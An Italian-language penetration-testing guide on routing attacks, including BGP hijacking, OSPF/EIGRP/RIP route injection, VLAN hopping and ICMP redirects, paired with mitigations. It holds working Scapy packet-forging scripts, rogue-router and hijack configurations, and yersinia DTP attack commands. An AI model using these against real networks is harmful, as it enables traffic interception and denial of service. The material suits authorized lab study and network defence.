# Route Manipulation Attacks

## Scopo

Questa guida copre gli attacchi di manipolazione delle rotte, inclusi BGP hijacking, OSPF/EIGRP attacks e route injection. Questi attacchi possono essere utilizzati per intercettare traffico o causare denial of service.

## Prerequisiti

- Conoscenza avanzata di protocolli di routing
- Accesso a router o dispositivi di rete
- GNS3/EVE-NG per lab
- **Autorizzazione scritta** per i test
- Ambiente di lab isolato

## Installazione

```bash
# FRRouting per lab
sudo apt-get install frr

# Scapy per packet crafting
pip install scapy
```

---

## Protocolli di Routing

| Protocollo | Tipo | Uso | Vulnerabilità |
|------------|------|-----|---------------|
| BGP | EGP | Inter-AS | Hijacking, leaks |
| OSPF | IGP | Intra-AS | LSA injection |
| EIGRP | IGP | Cisco | Route injection |
| RIP | IGP | Legacy | Spoofing |

---

## BGP Hijacking

### Concetti

```
BGP si basa sulla fiducia tra AS
- Nessuna verifica crittografica di default
- Gli annunci possono essere falsificati
- Prefix più specifico vince
```

### Tipi di Attacco

1. **Prefix Hijacking**: Annuncia prefix di altri
2. **Subprefix Hijacking**: Annuncia subnet più specifica
3. **Route Leak**: Propaga rotte non autorizzate
4. **Path Manipulation**: Modifica AS-PATH

### Esempio Hijacking

```
Legittimo: AS100 annuncia 192.168.0.0/16
Attacker: AS666 annuncia 192.168.0.0/24 (più specifico)
Risultato: Traffico verso 192.168.0.0/24 va ad AS666
```

### Lab con FRRouting

```bash
# Configurazione BGP base
router bgp 666
 bgp router-id 1.2.3.4
 neighbor 10.0.0.1 remote-as 100
 
 address-family ipv4 unicast
  # Annuncia prefix hijacked
  network 192.168.0.0/24
 exit-address-family
```

### Rilevamento

```bash
# BGP Looking Glass
# https://lg.he.net/

# RIPE RIS
# https://ris.ripe.net/

# BGPStream
bgpstream -p 192.168.0.0/24
```

---

## OSPF Attacks

### LSA Injection

```python
# Scapy - OSPF LSA injection
from scapy.all import *
from scapy.contrib.ospf import *

# Craft OSPF LSA
ospf_lsa = OSPF_Router_LSA(
    type=1,
    id="10.0.0.1",
    adrouter="10.0.0.1",
    seq=0x80000001,
    linkcount=1
)

# Invia
send(IP(dst="224.0.0.5")/OSPF_Hdr()/ospf_lsa)
```

### Rogue Router

```bash
# FRRouting - diventa router OSPF
router ospf
 ospf router-id 10.0.0.100
 network 10.0.0.0/24 area 0
 
 # Annuncia rotte false
 redistribute static
 
ip route 0.0.0.0/0 Null0
```

### Mitigazioni OSPF

```
# Autenticazione MD5
interface eth0
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 SecretKey

# Passive interfaces
router ospf
 passive-interface default
 no passive-interface eth0
```

---

## EIGRP Attacks

### Route Injection

```python
# Scapy EIGRP injection
from scapy.all import *
from scapy.contrib.eigrp import *

# Craft EIGRP Update
eigrp = EIGRP(
    opcode=1,  # Update
    asn=100,
)

# Aggiungi route falsa
route = EIGRPIntRoute(
    dst=IPNetwork("10.0.0.0/8"),
    nexthop="192.168.1.100"
)

send(IP(dst="224.0.0.10")/eigrp/route)
```

### Mitigazioni EIGRP

```
# Autenticazione
key chain EIGRP_KEY
 key 1
  key-string SecretKey123

interface eth0
 ip authentication mode eigrp 100 md5
 ip authentication key-chain eigrp 100 EIGRP_KEY
```

---

## RIP Attacks

### RIP Spoofing

```python
# Scapy RIP injection
from scapy.all import *

rip = RIP(cmd=2)/RIPEntry(
    addr="0.0.0.0",
    mask="0.0.0.0",
    metric=1,
    nextHop="192.168.1.100"
)

send(IP(dst="224.0.0.9")/UDP(sport=520,dport=520)/rip)
```

### Mitigazioni RIP

```
# Non usare RIP!
# Se necessario:
router rip
 version 2
 
key chain RIP_KEY
 key 1
  key-string SecretKey

interface eth0
 ip rip authentication mode md5
 ip rip authentication key-chain RIP_KEY
```

---

## VLAN Hopping

### Double Tagging

```python
# Scapy double tagging
from scapy.all import *

pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="target")/ICMP()
sendp(pkt, iface="eth0")
```

### Switch Spoofing

```bash
# Simula trunk con DTP
yersinia -G  # GUI

# CLI
yersinia dtp -attack 1 -interface eth0
```

### Mitigazioni

```
# Disabilita DTP
switchport mode access
switchport nonegotiate

# Native VLAN diversa da user VLANs
switchport trunk native vlan 999

# VLAN Pruning
switchport trunk allowed vlan 10,20,30
```

---

## ICMP Redirect

### Attacco

```python
from scapy.all import *

# ICMP Redirect
icmp = ICMP(
    type=5,  # Redirect
    code=1,  # Redirect for host
    gw="192.168.1.100"  # Nuovo gateway
)

ip = IP(src="192.168.1.1", dst="192.168.1.10")
target_ip = IP(dst="8.8.8.8")

send(ip/icmp/target_ip/ICMP())
```

### Mitigazioni

```bash
# Linux - ignora ICMP redirect
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
```

---

## Contromisure Generali

### BGP

- **RPKI**: Resource Public Key Infrastructure
- **BGPsec**: Firma crittografica AS-PATH
- **IRR Filtering**: Filtra in base a database IRR
- **Prefix Limits**: Limita prefissi accettati

### IGP

- **Autenticazione**: MD5/SHA per tutti i protocolli
- **Passive Interfaces**: Di default su interfacce non-routing
- **Route Filtering**: ACL su annunci accettati
- **TTL Security**: Accetta solo pacchetti con TTL alto

### Monitoring

```bash
# BGP monitoring
bgpmon.io
thousandeyes.com

# Route Views
routeviews.org
```

---

## Best Practices

- **Autenticazione sempre**: Su tutti i protocolli di routing
- **Filtraggio**: Definisci chiaramente cosa accettare
- **Monitoring**: Monitora cambiamenti nelle rotte
- **Segmentazione**: Isola routing plane
- **RPKI**: Implementa per BGP
- **Lab isolato**: Testa sempre in ambiente controllato

## Riferimenti

- [BGP Hijacking Paper](https://www.cs.princeton.edu/~jrex/papers/sigcomm10.pdf)
- [RPKI Documentation](https://rpki.readthedocs.io/)
- [FRRouting Documentation](https://docs.frrouting.org/)
- [MANRS - Routing Security](https://www.manrs.org/)
